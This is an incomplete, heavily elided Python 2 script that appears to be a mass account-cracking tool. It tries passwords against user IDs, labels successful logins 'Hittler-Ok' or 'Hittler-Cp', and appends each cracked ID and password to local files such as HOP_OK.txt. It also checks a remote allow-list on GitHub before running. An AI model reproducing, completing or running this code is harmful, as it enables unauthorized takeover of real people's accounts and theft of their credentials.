...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://raw.githubusercontent.com/ahmer-ali/steave/main/server.txt').text
    if to in r:
...
def a_s():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;92m[Hittler-Ok] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                print '\033[1;96m[Hittler-Cp] ' + uid + ' | ' + pass1
                cp = open('HOP_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[Hittler-Ok] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
